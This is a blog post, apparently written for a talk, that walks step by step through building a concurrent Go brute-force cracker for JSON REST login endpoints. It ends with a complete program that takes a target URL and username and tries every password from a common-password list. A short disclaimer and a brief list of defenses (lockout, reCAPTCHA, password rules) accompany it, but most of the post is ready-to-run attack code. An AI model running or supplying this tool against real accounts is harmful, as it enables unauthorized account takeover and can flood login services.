---
title: "Creating a Brute Force REST API Password Cracker"
date: 2018-06-24T07:49:00-04:00
draft: false
keywords:
- golang
- security
- password cracker
---

# Golang Password Cracker

### Disclaimer
All views and opinions expressed in this document are my own and not indicative of my employer's viewpoints in any regard. Furthermore, this exercise is intended to demonstrate the need for more robust passwords. The created program should not be used for anything malicious.

### Password Security & Best Practices
[Krebs Take](https://krebsonsecurity.com/password-dos-and-donts/)

I'm sure we've all seen user accounts with shoddy passwords, to demonstrate how easy it is to gain access to these accounts let's see if we can brute force their passwords.

First things first, we need a password list, so let's grab [one](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)

Now we need to build a program that makes a POST request to a JSON REST API. Ideally, we would pass in the username we want to target, and the url of the application so we can test out multiple platforms.

To build this program, let's use Golang because it's simple, fast, and excels in concurrency which will enable to make all the requests in parallel.

### Steps
1. Download Golang [mac](https://golang.org/doc/install?download=go1.10.1.darwin-amd64.pkg)
1. Create a folder in your golang directory (wherever you specified it) called `golang-brute-password`
1. Move the password file to the folder, call it `passwords.txt`
1. Create file main.go with the following
   ``` 
   package main

   func main(){
      fmt.Println("HELLO WORLD")
   }
   ```
1. run `go run main.go` -> you should see "HELLO WORLD" in the console
1. Let's create a function to read in the passwords and return an array of passwords. This should do:

   ```
      // readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
      func readInPasswords(passwordFile string) []string {
         b, err := ioutil.ReadFile(passwordFile) // just pass the file name
         if err != nil {
            fmt.Println(err)
         }
         str := string(b) // convert content to a 'string'

         return strings.Split(str, "\n")
      }
   ```
1. Now we need a function to actually make the POST request to the specified url. Try this:
   ```

   // postToURL
   // Succeeded = true if res.status == 200
   func postToURL(url string, username string, password string) (succeeded bool) {
      fmt.Println("password: ", password)
      values := map[string]string{"username": username, "email": username, "password": password}

      jsonValue, _ := json.Marshal(values)

      resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
      if err != nil {
         fmt.Println("Error occured: ", err)
         return false
      }
      defer resp.Body.Close()
      fmt.Println("Response status: ", resp.Status)
      var body interface{}
      json.NewDecoder(resp.Body).Decode(&body)
      fmt.Println(body)
      return resp.Status == "200"
   }

   ```
1. Now let's grab the url and username to target from the program arguments

   ```
   if len(os.Args) != 3 {
         log.Fatal("Please url to post and username")
      }
      url := os.Args[1]
      username := os.Args[2]
      passwords := readInPasswords("passwords.txt")
   ```
1. Now let's use a simple for loop to make the requests
   ```

      // one after another
      // for _, password := range passwords {
      // 	fmt.Println("password is: ", password)

      // 	if postToURL(url, username, password) {
      // 		fmt.Println("password is: ", password)
      // 	}
      // }
   ```
1. That's slow as hell, let's do it concurrently
   ```
      var wg sync.WaitGroup
      wg.Add(len(passwords))
      foundPassword := ""
      for _, password := range passwords {
         go func(password string) {
            defer wg.Done()
            fmt.Println("password is: ", password)
            if postToURL(url, username, password) {
               foundPassword = password
               fmt.Println("password is: ", password)
            }
         }(password)
      }

      wg.Wait() // wait until the for loop finishes
      fmt.Println("found password is: ", foundPassword)
   ```

1. Now we should be able to iterate through the password list in under 4-5 seconds... Wow..
1. How could we fix this and prevent users from weak passwords from being vulnerable to this attack?
      - Lock account after 5 failed login attempts. Need to contact an admin or re-verify your email.
      - Require the user fill out a Recaptcha on login.
      - Enforce strict password requirements. 8 characters + and 2 complexity cases
1. By processing each request or rate limiting the client, a server makes itself exceptionally vulnerable to DDOS. For those who don't know Krebs did a great writeup on DDOS [here](https://krebsonsecurity.com/tag/ddos/).

# How ya'll enjoyed the talk 

## Ps. our final program should look like this:

```
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
)

/*Main
 * Requires the url, port, and username to be sent as environment variables
 * Makes a POST request to the url with fields username, email, and password
 * Username and email values are set to the value provided in the program argument
 * Password values are taken from the passwords.txt file
 * All requests are JSON content type
 */
func main() {
	if len(os.Args) != 3 {
		log.Fatal("Please provide url and username")
	}
	url := os.Args[1]
	username := os.Args[2]
	passwords := readInPasswords("passwords.txt")

	// multithreaded solution
	var wg sync.WaitGroup
	wg.Add(len(passwords))
	foundPassword := ""
	for _, password := range passwords {
		go func(password string) {
			defer wg.Done()
			if postToURL(url, username, password) {
				foundPassword = password
			}
		}(password)
	}

	wg.Wait() // wait until the for loop finishes
	fmt.Println("found password is: ", foundPassword)
}

// readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
func readInPasswords(passwordFile string) []string {
	b, err := ioutil.ReadFile(passwordFile) // just pass the file name
	if err != nil {
		fmt.Println(err)
	}
	str := string(b) // convert content to a 'string'

	return strings.Split(str, "\n")
}

// postToURL
// Succeeded = true if res.status == 200
func postToURL(url string, username string, password string) (succeeded bool) {
	values := map[string]string{"username": username, "email": username, "password": password}

	jsonValue, _ := json.Marshal(values)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		fmt.Println("Error occured: ", err)
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		fmt.Println("Response status: ", resp.Status)
		var body interface{}
		json.NewDecoder(resp.Body).Decode(&body)
		fmt.Println(body)
	}
	return resp.StatusCode == 200
}

```

